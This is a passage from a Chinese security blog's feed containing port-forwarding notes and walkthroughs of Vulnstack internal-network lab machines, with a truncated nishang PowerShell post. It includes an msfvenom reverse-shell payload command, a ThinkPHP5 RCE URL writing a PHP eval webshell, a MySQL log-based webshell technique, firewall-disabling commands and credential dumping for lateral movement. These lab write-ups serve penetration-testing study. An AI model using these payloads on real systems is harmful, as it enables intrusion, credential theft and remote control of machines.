9dad768c6047500b9abeb80451faca6465a09b311551a7a38031cb44f5947dbb592b80525089b6810f8d18a5f0643f202a19ff7c0e8606524a0c2578833196f5d84002acfbfc565daf12d2087a03f4a07fa12ab27d9033e833ac8fb1667ff4dc9f11d3476d90ce6146c1bce8f8234ce42a0218f6a600f19787db33c512e948a38bc4404ba0c5b9872dd6f83e17689d39242aae835b11c98849862b464f76a363eae787f60f924ace9b392012115117554745b32b3e3617683109185b5f489e47fe8f567170e58c90c3131442b7c98afa90ef2d684c0945205df84506fab8df5d90c919ef38b9a1e4d8aca108377ddf80e927f7fc84881e71ce04659ec7441a062966e41a61c9c20da7ab6c8b8bf21e2c0b10dee2f787a5d1ca099e13c9e31e91be0c9e2d03a5edd131b64a76f91490a058d0b55a68ccea898a79704f683d89467d91d91e245cf3b3af0c7805ff2fb51a9fbbeba011d8f441bd8224d47aacb9a96cbafc5f6e1f5ec317dcc8ebbd0922a81aeffa2aec44838b2f3e41de32e2a23abd38500ba426cc1be71ccdea0763ef1679b4d5b3049f547df233bc4df93565abd7ee8b9974b16dc15b0a7e276c12ffbc8bb0990a713a1df466507d087060ca131ab4b8d5d98f3514d53fe27b0ac9c43ab8552a49cbb1e6df7f4a3d0a70eaf4e5d79303073ffdf78ecc2b9eca496ce517763fcb980b52dd2b353e2abc948e3c7651f76b0724bd6bbe591db2c2a06f4cf09aafd5e7b641b9a7f2632ade92c712d9b9c9f9d679c2fe82c27c510832d277848042d7ffb275ba44a5d1ca4cc6cad561e0e3edf40d7b3c061f2ec8e64e457a7f754e49bdc9646bea95ef0e99f32ae1e1840e65b5d128e82ecf45898b69ef4929c2da142fb3bdff581d34da7b84aa5b94e73ae7d1772df30b263d3248603548bd005db45b3ceeb17a255ed347d07f40782abefe567400038e51ca845a4cebd8da7f1a85b617a0e789fc5448f3f93a0ab82d61d65b218117aa522873b9b1b84dbf3be745e860ab18d3fd98e83a170b38baf0297d9c0f6d175c471714c0af2d936d1246aeae90803cd9e3640b5ab9c9dd888612f0ed66e39ee8dbb09bbc9f9e5054759fd6972c838a1abb7bd652299253c7c853e4cfbe9250e137a8a00a158ad660b3cce977f04e1abfa1b72e64de05cff6dac467efc08de75a91e9f9c3b96c53bcfcea8b0aa6bbc112af71973aea0857514a81c822b8dcfb4232fb13a3442a2496351ff3a35779c47e31be9e7bc625fbd1cc6098e02f8</script>  <div class="hbe hbe-content">    <div class="hbe hbe-input hbe-input-default">      <input class="hbe hbe-input-field hbe-input-field-default" type="password" id="hbePass">      <label class="hbe hbe-input-label hbe-input-label-default" for="hbePass">        <span class="hbe hbe-input-label-content hbe-input-label-content-default">当前文章暂不对外可见，请输入密码后查看！</span>      </label>    </div>  </div></div><script data-pjax src="/lib/hbe.js"></script><link href="/css/hbe.style.css" rel="stylesheet" type="text/css">]]></content>
    
    
    <categories>
      
      <category>内网安全</category>
      
    </categories>
    
    
    <tags>
      
      <tag>内网安全</tag>
      
      <tag>idea</tag>
      
      <tag>openssl</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>端口转发</title>
    <link href="/2022/06/15/%E7%AB%AF%E5%8F%A3%E8%BD%AC%E5%8F%91/%E7%AB%AF%E5%8F%A3%E8%BD%AC%E5%8F%91/"/>
    <url>/2022/06/15/%E7%AB%AF%E5%8F%A3%E8%BD%AC%E5%8F%91/%E7%AB%AF%E5%8F%A3%E8%BD%AC%E5%8F%91/</url>
    
    <content type="html"><![CDATA[<h2 id="netsh的基本使用（需要有admin权限）"><a href="#netsh的基本使用（需要有admin权限）" class="headerlink" title="netsh的基本使用（需要有admin权限）"></a>netsh的基本使用（需要有admin权限）</h2><p>通过做端口映射访问内网主机<br><strong>做映射</strong></p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs routeros">netsh<span class="hljs-built_in"> interface </span>portproxy <span class="hljs-built_in">add</span> v4tov4 <span class="hljs-attribute">listenaddress</span>=192.168.101.107 <span class="hljs-attribute">listenport</span>=14941     <span class="hljs-attribute">connectaddress</span>=192.168.101.106 <span class="hljs-attribute">connectport</span>=1494<br></code></pre></td></tr></table></figure><p>其中listenaddress是我们监听的地址<br>listenport是监听端口<br>connectaddress 是连接地址</p><p>还可以这样写</p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs routeros">netsh<span class="hljs-built_in"> interface </span>portproxy <span class="hljs-built_in">add</span> v4tov4 <span class="hljs-attribute">listenport</span>=14941 <span class="hljs-attribute">connectaddress</span>=192.168.101.106 <span class="hljs-attribute">connectport</span>=1494<br></code></pre></td></tr></table></figure><p><strong>使用下面命令进行查看端口</strong></p><figure class="highlight angelscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs angelscript">netsh <span class="hljs-keyword">interface</span> <span class="hljs-symbol">portproxy</span> <span class="hljs-symbol">show</span> <span class="hljs-symbol">v4tov4</span><br></code></pre></td></tr></table></figure><p><strong>取消端口转发：</strong></p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs routeros">netsh<span class="hljs-built_in"> interface </span>portproxy delete v4tov4 <span class="hljs-attribute">listenaddress</span>=192.168.101.107 <span class="hljs-attribute">listenport</span>=14941<br></code></pre></td></tr></table></figure><p><strong>清除所有规则</strong></p><figure class="highlight angelscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs angelscript">netsh <span class="hljs-keyword">interface</span> <span class="hljs-symbol">portproxy</span> <span class="hljs-symbol">reset</span><br></code></pre></td></tr></table></figure><h2 id="MSF利用netsh转发"><a href="#MSF利用netsh转发" class="headerlink" title="MSF利用netsh转发"></a>MSF利用netsh转发</h2><p><img src="/2022/06/15/%E7%AB%AF%E5%8F%A3%E8%BD%AC%E5%8F%91/%E7%AB%AF%E5%8F%A3%E8%BD%AC%E5%8F%91/image-20240107154635767.png" alt="image-20240107154635767">在msf中生成木马</p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs routeros">msfvenom -p windows/x64/meterpreter/reverse_tcp <span class="hljs-attribute">lhost</span>=10.10.10.153 <span class="hljs-attribute">lport</span>=4455 -f exe &gt; one.exe  <br></code></pre></td></tr></table></figure><p>在A服务器上使用netsh做转发</p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs routeros">netsh<span class="hljs-built_in"> interface </span>portproxy <span class="hljs-built_in">add</span> v4tov4 <span class="hljs-attribute">listenport</span>=4455 <span class="hljs-attribute">connectaddress</span>=192.168.0.135 <span class="hljs-attribute">connectport</span>=4455<br></code></pre></td></tr></table></figure><p>在kali中设置监听</p><figure class="highlight gams"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs gams">use windows/multi/handler<br><span class="hljs-keyword">set</span> windows/meterpreter/reverse_tcp<br><span class="hljs-keyword">set</span> <span class="hljs-comment">lhost 192.168.0.135</span><br><span class="hljs-keyword">set</span> <span class="hljs-comment">lport 4455</span><br></code></pre></td></tr></table></figure><h2 id="cobaltstrike利用netsh转发"><a href="#cobaltstrike利用netsh转发" class="headerlink" title="cobaltstrike利用netsh转发"></a>cobaltstrike利用netsh转发</h2><p><img src="/2022/06/15/%E7%AB%AF%E5%8F%A3%E8%BD%AC%E5%8F%91/%E7%AB%AF%E5%8F%A3%E8%BD%AC%E5%8F%91/image-20240107154644728.png" alt="image-20240107154644728"></p><h2 id="msf下的端口转发"><a href="#msf下的端口转发" class="headerlink" title="msf下的端口转发"></a>msf下的端口转发</h2><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">portfwd</span>   add -l <span class="hljs-number">8080</span> r <span class="hljs-number">192.168.1.1</span> -p <span class="hljs-number">80</span><br></code></pre></td></tr></table></figure><p>将本地8080端口的请求转发到远端的80端口上</p>]]></content>
    
    
    <categories>
      
      <category>内网安全</category>
      
    </categories>
    
    
    <tags>
      
      <tag>内网安全</tag>
      
      <tag>端口转发</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>红日内网靶机五</title>
    <link href="/2022/06/15/%E7%BA%A2%E6%97%A5%E5%86%85%E7%BD%91%E9%9D%B6%E6%9C%BA%E4%BA%94/index/"/>
    <url>/2022/06/15/%E7%BA%A2%E6%97%A5%E5%86%85%E7%BD%91%E9%9D%B6%E6%9C%BA%E4%BA%94/index/</url>
    
    <content type="html"><![CDATA[<p>靶机下载地址:<a href="http://vulnstack.qiyuanxuetang.net/vuln/">http://vulnstack.qiyuanxuetang.net/vuln/</a> win7（双网卡）： 192.168.1.18外网） 192.168.138.136（内网）</p><p>win2008:192.168.138.138</p><h1 id="外网打点"><a href="#外网打点" class="headerlink" title="外网打点"></a>外网打点</h1><p><img src="/2022/06/15/%E7%BA%A2%E6%97%A5%E5%86%85%E7%BD%91%E9%9D%B6%E6%9C%BA%E4%BA%94/index/image-20240107155302451.png" alt="image-20240107155302451"></p><p>访问80看看，是TP5的站</p><p><img src="/2022/06/15/%E7%BA%A2%E6%97%A5%E5%86%85%E7%BD%91%E9%9D%B6%E6%9C%BA%E4%BA%94/index/image-20240107155311145.png" alt="image-20240107155311145"></p><p>关于tp5的漏洞利用方式请查看：<a href="https://www.cnblogs.com/backlion/p/10106676.html">https://www.cnblogs.com/backlion/p/10106676.html</a></p><p>成功利用，并执行了命令</p><p><img src="/2022/06/15/%E7%BA%A2%E6%97%A5%E5%86%85%E7%BD%91%E9%9D%B6%E6%9C%BA%E4%BA%94/index/image-20240107155319436.png" alt="image-20240107155319436"></p><p>写入shell</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs js"><span class="hljs-attr">http</span>:<span class="hljs-comment">//192.168.1.18/index.php?s=/index/\think\app/invokefunction&amp;function=call_user_func_array&amp;vars[0]=system&amp;vars[1][]=echo ^&lt;?php @eval($_POST[&quot;code&quot;]);?^&gt;&gt;shell.php</span><br></code></pre></td></tr></table></figure><p><img src="/2022/06/15/%E7%BA%A2%E6%97%A5%E5%86%85%E7%BD%91%E9%9D%B6%E6%9C%BA%E4%BA%94/index/image-20240107155327337.png" alt="image-20240107155327337"></p><p><img src="/2022/06/15/%E7%BA%A2%E6%97%A5%E5%86%85%E7%BD%91%E9%9D%B6%E6%9C%BA%E4%BA%94/index/image-20240107155338352.png" alt="image-20240107155338352"></p><p>上线C2</p><p><img src="/2022/06/15/%E7%BA%A2%E6%97%A5%E5%86%85%E7%BD%91%E9%9D%B6%E6%9C%BA%E4%BA%94/index/image-20240107155345635.png" alt="image-20240107155345635"></p><h1 id="内网渗透"><a href="#内网渗透" class="headerlink" title="内网渗透"></a>内网渗透</h1><p><img src="/2022/06/15/%E7%BA%A2%E6%97%A5%E5%86%85%E7%BD%91%E9%9D%B6%E6%9C%BA%E4%BA%94/index/image-20240107155353413.png" alt="image-20240107155353413"></p><p><img src="/2022/06/15/%E7%BA%A2%E6%97%A5%E5%86%85%E7%BD%91%E9%9D%B6%E6%9C%BA%E4%BA%94/index/image-20240107155403691.png" alt="image-20240107155403691"></p><p>内网存活主机探测</p><p><img src="/2022/06/15/%E7%BA%A2%E6%97%A5%E5%86%85%E7%BD%91%E9%9D%B6%E6%9C%BA%E4%BA%94/index/image-20240107155411626.png" alt="image-20240107155411626"></p><p>查看域控</p><p><img src="/2022/06/15/%E7%BA%A2%E6%97%A5%E5%86%85%E7%BD%91%E9%9D%B6%E6%9C%BA%E4%BA%94/index/image-20240107155418963.png" alt="image-20240107155418963"></p><p><img src="/2022/06/15/%E7%BA%A2%E6%97%A5%E5%86%85%E7%BD%91%E9%9D%B6%E6%9C%BA%E4%BA%94/index/image-20240107155428008.png" alt="image-20240107155428008"></p><p>现在已经是管理员权限了可以直接抓下密码看看</p><p><img src="/2022/06/15/%E7%BA%A2%E6%97%A5%E5%86%85%E7%BD%91%E9%9D%B6%E6%9C%BA%E4%BA%94/index/image-20240107155436964.png" alt="image-20240107155436964"></p><p>上链路进行横向</p><p><img src="/2022/06/15/%E7%BA%A2%E6%97%A5%E5%86%85%E7%BD%91%E9%9D%B6%E6%9C%BA%E4%BA%94/index/image-20240107155445862.png" alt="image-20240107155445862"></p><p><img src="/2022/06/15/%E7%BA%A2%E6%97%A5%E5%86%85%E7%BD%91%E9%9D%B6%E6%9C%BA%E4%BA%94/index/image-20240107155454800.png" alt="image-20240107155454800"></p><p>生成载荷上传到目标机器</p><p><img src="/2022/06/15/%E7%BA%A2%E6%97%A5%E5%86%85%E7%BD%91%E9%9D%B6%E6%9C%BA%E4%BA%94/index/image-20240107155505130.png" alt="image-20240107155505130"></p><p>批量上线DC不成功</p><p><img src="/2022/06/15/%E7%BA%A2%E6%97%A5%E5%86%85%E7%BD%91%E9%9D%B6%E6%9C%BA%E4%BA%94/index/image-20240107155515875.png" alt="image-20240107155515875"></p><h3 id="因为win7的防火墙缘故，5555端口是进不去的可以，关闭防火墙-NetSh-Advfirewall-set-allprofiles-state-off-，或者添加规则来放行5555端口"><a href="#因为win7的防火墙缘故，5555端口是进不去的可以，关闭防火墙-NetSh-Advfirewall-set-allprofiles-state-off-，或者添加规则来放行5555端口" class="headerlink" title="**因为win7的防火墙缘故，5555端口是进不去的可以，关闭防火墙:**NetSh Advfirewall set allprofiles state off ，或者添加规则来放行5555端口"></a>**因为win7的防火墙缘故，5555端口是进不去的可以，关闭防火墙:**<strong>NetSh Advfirewall set allprofiles state off</strong> <strong>，或者添加规则来放行5555端口</strong></h3><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs js">netsh advfirewall firewall add rule name=cs dir=<span class="hljs-keyword">in</span> action=allow protocol=<span class="hljs-variable constant_">TCP</span> localport=<span class="hljs-number">5555</span><br></code></pre></td></tr></table></figure><p><img src="/2022/06/15/%E7%BA%A2%E6%97%A5%E5%86%85%E7%BD%91%E9%9D%B6%E6%9C%BA%E4%BA%94/index/image-20240107155531308.png" alt="image-20240107155531308"></p><p>最后全部上线</p><p><img src="/2022/06/15/%E7%BA%A2%E6%97%A5%E5%86%85%E7%BD%91%E9%9D%B6%E6%9C%BA%E4%BA%94/index/image-20240107155538623.png" alt="image-20240107155538623"></p>]]></content>
    
    
    <categories>
      
      <category>内网安全</category>
      
    </categories>
    
    
    <tags>
      
      <tag>内网安全</tag>
      
      <tag>靶机复现</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>红日内网靶机一</title>
    <link href="/2022/06/15/%E7%BA%A2%E6%97%A5%E5%86%85%E7%BD%91%E9%9D%B6%E6%9C%BA%E4%B8%80/index/"/>
    <url>/2022/06/15/%E7%BA%A2%E6%97%A5%E5%86%85%E7%BD%91%E9%9D%B6%E6%9C%BA%E4%B8%80/index/</url>
    
    <content type="html"><![CDATA[<p>拓朴图如下： </p><p>（win7为VM1（192.168.1.9、192.168.52.2），win2003为VM2（192.168.52.3，win2008为VM3（192.168.52.1））</p><p><img src="/2022/06/15/%E7%BA%A2%E6%97%A5%E5%86%85%E7%BD%91%E9%9D%B6%E6%9C%BA%E4%B8%80/index/image-20240107155602886.png" alt="image-20240107155602886"></p><p>靶机下载地址：<a href="http://vulnstack.qiyuanxuetang.net/vuln/detail/2/">http://vulnstack.qiyuanxuetang.net/vuln/detail/2/</a></p><h1 id="外网打点"><a href="#外网打点" class="headerlink" title="外网打点"></a>外网打点</h1><p>对web服务器进行端口扫描一波<br><img src="/2022/06/15/%E7%BA%A2%E6%97%A5%E5%86%85%E7%BD%91%E9%9D%B6%E6%9C%BA%E4%B8%80/index/image-20240107155612632.png" alt="image-20240107155612632">发现存在80和3306端口，访问80端口如下<br><img src="/2022/06/15/%E7%BA%A2%E6%97%A5%E5%86%85%E7%BD%91%E9%9D%B6%E6%9C%BA%E4%B8%80/index/image-20240107155621032.png" alt="image-20240107155621032">发现是phpstudy的一个探针，那么就有可能会有phpmyadmin的web管理界面，目录扫描一波<br><img src="/2022/06/15/%E7%BA%A2%E6%97%A5%E5%86%85%E7%BD%91%E9%9D%B6%E6%9C%BA%E4%B8%80/index/image-20240107155631862.png" alt="image-20240107155631862">发现确实存在，访问看看<br><img src="/2022/06/15/%E7%BA%A2%E6%97%A5%E5%86%85%E7%BD%91%E9%9D%B6%E6%9C%BA%E4%B8%80/index/image-20240107155641332.png" alt="image-20240107155641332">随手一个root&#x2F;root就进去了，现在就是通过这玩意儿拿shell了<br>有兴趣的读者可以看看这篇关于phpmyadmin漏洞的总结文章：<a href="https://www.cnblogs.com/liliyuanshangcao/p/13815242.html#_label0_0">https://www.cnblogs.com/liliyuanshangcao/p/13815242.html#_label0_0</a><br>这里通过日志文件来进行拿shell</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-comment">#开启日志记录:</span><br><span class="hljs-built_in">set</span> global general_log = <span class="hljs-string">&quot;ON&quot;</span>;<br><span class="hljs-comment">#查看当前的日志目录:</span><br>show variables like <span class="hljs-string">&#x27;general%&#x27;</span>;<br><span class="hljs-comment">#指定日志文件</span><br><span class="hljs-built_in">set</span> global general_log_file = <span class="hljs-string">&quot;指定日志文件的路径&quot;</span>;<br></code></pre></td></tr></table></figure><p>我们在前面通过phpstudy的探针可以知道网站的路径<br><img src="/2022/06/15/%E7%BA%A2%E6%97%A5%E5%86%85%E7%BD%91%E9%9D%B6%E6%9C%BA%E4%B8%80/index/image-20240107155650584.png" alt="image-20240107155650584"><br><img src="/2022/06/15/%E7%BA%A2%E6%97%A5%E5%86%85%E7%BD%91%E9%9D%B6%E6%9C%BA%E4%B8%80/index/image-20240107155659302.png" alt="image-20240107155659302">设置成功，写入代码</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">select <span class="hljs-string">&quot;&lt;?php eval(<span class="hljs-variable">$_POST</span>[&#x27;x&#x27;]); ?&gt;&quot;</span><br></code></pre></td></tr></table></figure><p><img src="/2022/06/15/%E7%BA%A2%E6%97%A5%E5%86%85%E7%BD%91%E9%9D%B6%E6%9C%BA%E4%B8%80/index/image-20240107155707463.png" alt="image-20240107155707463">用蚁剑连接<br><img src="/2022/06/15/%E7%BA%A2%E6%97%A5%E5%86%85%E7%BD%91%E9%9D%B6%E6%9C%BA%E4%B8%80/index/image-20240107155720353.png" alt="image-20240107155720353">我这里直接用蚁剑上线C2马子<br><img src="/2022/06/15/%E7%BA%A2%E6%97%A5%E5%86%85%E7%BD%91%E9%9D%B6%E6%9C%BA%E4%B8%80/index/image-20240107155729055.png" alt="image-20240107155729055">内网渗透</p><p>这里直接就是管理员权限了<br><img src="/2022/06/15/%E7%BA%A2%E6%97%A5%E5%86%85%E7%BD%91%E9%9D%B6%E6%9C%BA%E4%B8%80/index/image-20240107155736518.png" alt="image-20240107155736518">用mimikatz跑一波<br><img src="/2022/06/15/%E7%BA%A2%E6%97%A5%E5%86%85%E7%BD%91%E9%9D%B6%E6%9C%BA%E4%B8%80/index/image-20240107155745730.png" alt="image-20240107155745730">查看网卡<br><img src="/2022/06/15/%E7%BA%A2%E6%97%A5%E5%86%85%E7%BD%91%E9%9D%B6%E6%9C%BA%E4%B8%80/index/image-20240107155753847.png" alt="image-20240107155753847">看看内网存活有那些主机和端口情况<br>这里应因为内网机不出网，密码也跑出来，万事具备只欠东风了(这里图片挂掉了)</p><p>首先在已上线的机器上创建如下监听，监听端口可自定义。利用已上线的主机，将它做一个Listener，实现链路上线CobalStrike。</p><p><img src="/2022/06/15/%E7%BA%A2%E6%97%A5%E5%86%85%E7%BD%91%E9%9D%B6%E6%9C%BA%E4%B8%80/index/image-20240107155801514.png" alt="image-20240107155801514"></p><p>生成payload载荷<br><img src="/2022/06/15/%E7%BA%A2%E6%97%A5%E5%86%85%E7%BD%91%E9%9D%B6%E6%9C%BA%E4%B8%80/index/image-20240107155809114.png" alt="image-20240107155809114">这里选择我们刚刚创建的那个listener<br><img src="/2022/06/15/%E7%BA%A2%E6%97%A5%E5%86%85%E7%BD%91%E9%9D%B6%E6%9C%BA%E4%B8%80/index/image-20240107155817857.png" alt="image-20240107155817857">将生成的载荷上传到目标机器，并执行<br><img src="/2022/06/15/%E7%BA%A2%E6%97%A5%E5%86%85%E7%BD%91%E9%9D%B6%E6%9C%BA%E4%B8%80/index/image-20240107155828131.png" alt="image-20240107155828131"><br><img src="/2022/06/15/%E7%BA%A2%E6%97%A5%E5%86%85%E7%BD%91%E9%9D%B6%E6%9C%BA%E4%B8%80/index/image-20240107155836668.png" alt="image-20240107155836668"><br><img src="/2022/06/15/%E7%BA%A2%E6%97%A5%E5%86%85%E7%BD%91%E9%9D%B6%E6%9C%BA%E4%B8%80/index/image-20240107155845217.png" alt="image-20240107155845217">接下来就可以对其他的内网机进行上线了<br><img src="/2022/06/15/%E7%BA%A2%E6%97%A5%E5%86%85%E7%BD%91%E9%9D%B6%E6%9C%BA%E4%B8%80/index/image-20240107155855652.png" alt="image-20240107155855652"><br><img src="/2022/06/15/%E7%BA%A2%E6%97%A5%E5%86%85%E7%BD%91%E9%9D%B6%E6%9C%BA%E4%B8%80/index/image-20240107155904156.png" alt="image-20240107155904156">全部成功上线<br><img src="/2022/06/15/%E7%BA%A2%E6%97%A5%E5%86%85%E7%BD%91%E9%9D%B6%E6%9C%BA%E4%B8%80/index/image-20240107155914178.png" alt="image-20240107155914178">因为这是link链接，只要主链路（即出网机Listener)掉线，就都会掉线！</p>]]></content>
    
    
    <categories>
      
      <category>内网安全</category>
      
    </categories>
    
    
    <tags>
      
      <tag>内网安全</tag>
      
      <tag>靶机复现</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>红日内网靶机二</title>
    <link href="/2022/06/15/%E7%BA%A2%E6%97%A5%E5%86%85%E7%BD%91%E9%9D%B6%E6%9C%BA%E4%BA%8C/index/"/>
    <url>/2022/06/15/%E7%BA%A2%E6%97%A5%E5%86%85%E7%BD%91%E9%9D%B6%E6%9C%BA%E4%BA%8C/index/</url>
    
    <content type="html"><![CDATA[<p>大致拓扑图如下</p><p><img src="/2022/06/15/%E7%BA%A2%E6%97%A5%E5%86%85%E7%BD%91%E9%9D%B6%E6%9C%BA%E4%BA%8C/index/image-20240107154925962.png" alt="image-20240107154925962"></p><p>web win server2008(10.0.10.80,192.168.1.16)</p><p>pc win7(10.10.10.201)</p><p>dc win server2012(10.10.10.10)</p><h1 id="外网打点"><a href="#外网打点" class="headerlink" title="外网打点"></a>外网打点</h1><p>端口探测</p><p><img src="/2022/06/15/%E7%BA%A2%E6%97%A5%E5%86%85%E7%BD%91%E9%9D%B6%E6%9C%BA%E4%BA%8C/index/image-20240107154942829.png" alt="image-20240107154942829"></p><p>发现有7001端口，可能存在weblogic</p><p><img src="/2022/06/15/%E7%BA%A2%E6%97%A5%E5%86%85%E7%BD%91%E9%9D%B6%E6%9C%BA%E4%BA%8C/index/image-20240107154953594.png" alt="image-20240107154953594"></p><p>确实存在探测下目录</p><p><img src="/2022/06/15/%E7%BA%A2%E6%97%A5%E5%86%85%E7%BD%91%E9%9D%B6%E6%9C%BA%E4%BA%8C/index/image-20240107155006459.png" alt="image-20240107155006459"></p><p><img src="/2022/06/15/%E7%BA%A2%E6%97%A5%E5%86%85%E7%BD%91%E9%9D%B6%E6%9C%BA%E4%BA%8C/index/image-20240107155014833.png" alt="image-20240107155014833"></p><p>弱口令无果，尝试用工具利用</p><p><img src="/2022/06/15/%E7%BA%A2%E6%97%A5%E5%86%85%E7%BD%91%E9%9D%B6%E6%9C%BA%E4%BA%8C/index/image-20240107155023939.png" alt="image-20240107155023939"></p><p>存在漏洞并且返回了用户名</p><p><img src="/2022/06/15/%E7%BA%A2%E6%97%A5%E5%86%85%E7%BD%91%E9%9D%B6%E6%9C%BA%E4%BA%8C/index/image-20240107155033016.png" alt="image-20240107155033016"></p><p>能成功执行命令，我这里就直接上传webshell。</p><p>关于weblogic上传路径问题请参考：<a href="https://www.cnblogs.com/sstfy/p/10350915.html">https://www.cnblogs.com/sstfy/p/10350915.html</a></p><p><img src="/2022/06/15/%E7%BA%A2%E6%97%A5%E5%86%85%E7%BD%91%E9%9D%B6%E6%9C%BA%E4%BA%8C/index/image-20240107155041631.png" alt="image-20240107155041631"></p><p>因为这里目标机有杀软上传普通马子会被连不上，所以我这里直接用冰歇的马子</p><p><img src="/2022/06/15/%E7%BA%A2%E6%97%A5%E5%86%85%E7%BD%91%E9%9D%B6%E6%9C%BA%E4%BA%8C/index/image-20240107155052955.png" alt="image-20240107155052955"></p><p>为了方便操作弹个shell到c2上</p><p><img src="/2022/06/15/%E7%BA%A2%E6%97%A5%E5%86%85%E7%BD%91%E9%9D%B6%E6%9C%BA%E4%BA%8C/index/image-20240107155100840.png" alt="image-20240107155100840"></p><p>提下权（我这里用的ms15-051）</p><p><img src="/2022/06/15/%E7%BA%A2%E6%97%A5%E5%86%85%E7%BD%91%E9%9D%B6%E6%9C%BA%E4%BA%8C/index/image-20240107155108633.png" alt="image-20240107155108633"></p><p>信息收集一波</p><p><img src="/2022/06/15/%E7%BA%A2%E6%97%A5%E5%86%85%E7%BD%91%E9%9D%B6%E6%9C%BA%E4%BA%8C/index/image-20240107155117697.png" alt="image-20240107155117697"></p><p><img src="/2022/06/15/%E7%BA%A2%E6%97%A5%E5%86%85%E7%BD%91%E9%9D%B6%E6%9C%BA%E4%BA%8C/index/image-20240107155125604.png" alt="image-20240107155125604"></p><p><img src="/2022/06/15/%E7%BA%A2%E6%97%A5%E5%86%85%E7%BD%91%E9%9D%B6%E6%9C%BA%E4%BA%8C/index/image-20240107155133795.png" alt="image-20240107155133795"></p><p>基本可判断域控主机为10.10.10.10</p><p><img src="/2022/06/15/%E7%BA%A2%E6%97%A5%E5%86%85%E7%BD%91%E9%9D%B6%E6%9C%BA%E4%BA%8C/index/image-20240107155141858.png" alt="image-20240107155141858"></p><p><img src="/2022/06/15/%E7%BA%A2%E6%97%A5%E5%86%85%E7%BD%91%E9%9D%B6%E6%9C%BA%E4%BA%8C/index/image-20240107155149638.png" alt="image-20240107155149638"></p><p>看一下内网主机存活情况</p><p><img src="/2022/06/15/%E7%BA%A2%E6%97%A5%E5%86%85%E7%BD%91%E9%9D%B6%E6%9C%BA%E4%BA%8C/index/image-20240107155157985.png" alt="image-20240107155157985"></p><p>抓下密码进行横向</p><p><img src="/2022/06/15/%E7%BA%A2%E6%97%A5%E5%86%85%E7%BD%91%E9%9D%B6%E6%9C%BA%E4%BA%8C/index/image-20240107155206468.png" alt="image-20240107155206468"></p><p>这里由于目标机不出网，这里做链路上线。</p><p><img src="/2022/06/15/%E7%BA%A2%E6%97%A5%E5%86%85%E7%BD%91%E9%9D%B6%E6%9C%BA%E4%BA%8C/index/image-20240107155215627.png" alt="image-20240107155215627"></p><p><img src="/2022/06/15/%E7%BA%A2%E6%97%A5%E5%86%85%E7%BD%91%E9%9D%B6%E6%9C%BA%E4%BA%8C/index/image-20240107155222652.png" alt="image-20240107155222652"></p><p>生成载荷上传目标机并执行</p><p><img src="/2022/06/15/%E7%BA%A2%E6%97%A5%E5%86%85%E7%BD%91%E9%9D%B6%E6%9C%BA%E4%BA%8C/index/image-20240107155230464.png" alt="image-20240107155230464"></p><p>利用抓取得凭证进行批量上线</p><p><img src="/2022/06/15/%E7%BA%A2%E6%97%A5%E5%86%85%E7%BD%91%E9%9D%B6%E6%9C%BA%E4%BA%8C/index/image-20240107155240138.png" alt="image-20240107155240138"></p>]]></content>
    
    
    <categories>
      
      <category>内网安全</category>
      
    </categories>
    
    
    <tags>
      
      <tag>内网安全</tag>
      
      <tag>靶机复现</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>nishang学习</title>
    <link href="/2022/06/15/nishang%E5%AD%A6%E4%B9%A0/nishang%E5%AD%A6%E4%B9%A0/"/>
    <url>/2022/06/15/nishang%E5%AD%A6%E4%B9%A0/nishang%E5%AD%A6%E4%B9%A0/</url>
    
    <content type="html"><![CDATA[<h2 id="nishang模块及其功能"><a href="#nishang模块及其功能" class="headerlink" title="nishang模块及其功能"></a>nishang模块及其功能</h2><table><thead><tr><th>模块</th><th>功能</th></tr></thead><tbody><tr><td>Antak-Webshell</td><td>webshell</td></tr><tr><td>Backdoors</td><td>后门</td></tr><tr><td>Client</td><td>客户端</td></tr><tr><td>Escalation</td><td>提权</td></tr><tr><td>Execution</td><td>RCE</td></tr><tr><td>Gather</td><td>信息收集</td></tr><tr><td>Misc</td><td>杂项</td></tr><tr><td>Pivot</td><td>跳板&#x2F;远程控制  EXE</td></tr><tr><td>Scan</td><td>扫描</td></tr><tr><td>powerpreter</td><td>Meterreter会话</td></tr><tr><td></td><td></td></tr></tbody></table><h2 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h2><ul><li><p><strong>Check-VM</strong><br>检查是否为虚拟机</p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs powershell">powershell <span class="hljs-literal">-nop</span> <span class="hljs-literal">-c</span> <span class="hljs-string">&quot;iex(New-Object 